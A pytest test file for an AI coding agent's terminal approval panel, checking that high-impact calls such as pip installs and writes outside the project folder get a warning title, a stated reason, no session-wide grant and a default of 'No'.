        assert cells(parts[row][1] + parts[row + 1][1]) == 76
        chosen = [p for p in parts if p[0].startswith("class:chosen")]
        assert ("class:chosen class:accent", "❯") in chosen
        assert cells("".join(p[1] for p in chosen)) == 80
        now[0] += APPROVAL_KEY_GUARD_S + 0.1
        app.type("3")
        await app.wait(lambda: "Reason" in app.text())
        # While a reason is typed, its answer keeps the accent, with no band.
        parts = app.ui._panel_fragments()
        assert not any(p[0].startswith("class:chosen") for p in parts)
        assert any(p[0] == "class:accent" and "3. No" in p[1] for p in parts)
        app.type("\r")
        await asyncio.wait_for(asking, 3)


# ── High-impact calls: the title, the reasons, no session choice (#279) ──

_PIP = ActionReview(
    "high",
    ("install", "env"),
    (
        "Installs playwright with pip into .signin_venv (downloads about 43 MB).",
        "Creates a Python environment in .signin_venv.",
    ),
)


def _reviewed(review: ActionReview | None) -> ApprovalRequest:
    return dataclasses.replace(
        _request("python_exec", code="import subprocess"), review=review
    )


@pytest.mark.parametrize(
    ("review", "title", "notes"),
    [
        (None, "Run Python code?", ()),
        (ActionReview("routine"), "Run Python code?", ()),
        (
            ActionReview("undecided", reasons=("Builds a command.",)),
            "Run Python code?",
            (),
        ),
        (
            _PIP,
            "Install software?",
            (
                "melo asks because this call installs playwright with pip into "
                ".signin_venv (downloads about 43 MB); creates a Python environment "
                "in .signin_venv.",
            ),
        ),
    ],
    ids=["unreviewed", "routine", "undecided", "high"],
)
def test_only_a_high_impact_call_gets_a_review_title_and_note(
    review: ActionReview | None, title: str, notes: tuple[str, ...]
) -> None:
    text = panel_text(_reviewed(review), width=60)
    assert (text.title, text.notes) == (title, notes)
    assert text.header == f"python_exec · in {WORKSPACE}"


def test_a_title_that_names_the_folder_and_a_reason_with_control_characters() -> None:
    review = ActionReview("high", ("outside_write",), ("Writes \x1b[2Jx.",))
    text = panel_text(_reviewed(review), width=60)
    assert text.title == "Change files outside demo-project?"
    assert text.notes == ("melo asks because this call writes \\x1b[2Jx.",)
    assert text.escaped


async def test_a_high_impact_call_has_no_session_choice_and_starts_on_no() -> None:
    approver = TerminalApprover()
    asking = asyncio.ensure_future(approver.ask(_reviewed(_PIP)))
    await asyncio.sleep(0)
    pending = approver.pending
    assert pending is not None
    assert (pending.offer_session, pending.selected) == (False, 2)
    approver.answer("session")
    assert not asking.done()
    approver.answer("once")
    assert await asking == ApprovalDecision(True)


@pytest.mark.parametrize(
    "review",
    [None, ActionReview("routine"), ActionReview("undecided")],
    ids=["unreviewed", "routine", "undecided"],
)
async def test_every_other_call_still_offers_the_session_choice(
    review: ActionReview | None,
) -> None:
    approver = TerminalApprover()
    asking = asyncio.ensure_future(approver.ask(_reviewed(review)))
    await asyncio.sleep(0)
    pending = approver.pending
    assert pending is not None
    assert (pending.offer_session, pending.selected) == (True, 0)
    approver.answer("session")
    assert await asking == ApprovalDecision(True, remember=True)


async def test_the_high_impact_panel_shows_why_and_answers_by_position(
    now: list[float],
) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_reviewed(_PIP)))
        await app.wait(lambda: "Install software?" in app.text())
        text = app.text()
        assert "╭─ Install software? ─" in text
        assert "⚠ melo asks because this call installs playwright with pip" in text
        assert "  1. Yes" in text and "❯ 2. No, and tell melo why" in text
        assert "allow every" not in text and "3." not in text
        assert (
            "Session grants never cover installs, downloads or changes outside "
            "the folder." in " ".join(text.split())
        )
        assert "enter confirm · 1-2 · v view all" in text
        now[0] += 1
        app.type("3")  # there is no third option
        await app.settle()
        assert not asking.done()
        app.type(ENTER)  # Enter on the preselected No opens the reason field
        await app.wait(lambda: "Reason (optional" in app.text())
        app.type(ESC)
        await app.wait(lambda: "Reason (optional" not in app.text(), timeout_s=3)
        app.type("\x1b[A")  # up: Yes, the only other choice
        await app.wait(lambda: "❯ 1. Yes" in app.text(), timeout_s=3)
        app.type(ENTER)
        assert await asyncio.wait_for(asking, 3) == ApprovalDecision(True)


async def test_a_routine_panel_keeps_its_three_options(now: list[float]) -> None:
    approver = TerminalApprover(clock=lambda: now[0])
    async with running_app(approver=approver, clock=lambda: now[0]) as app:
        asking = asyncio.ensure_future(approver.ask(_reviewed(ActionReview("routine"))))
        await app.wait(lambda: "Run Python code?" in app.text())
        text = app.text()
        assert "❯ 1. Yes" in text and "3. No, and tell melo why" in text
        assert "melo asks because" not in text and "never cover" not in text
        now[0] += 1
        app.type("1")
        await asyncio.wait_for(asking, 3)
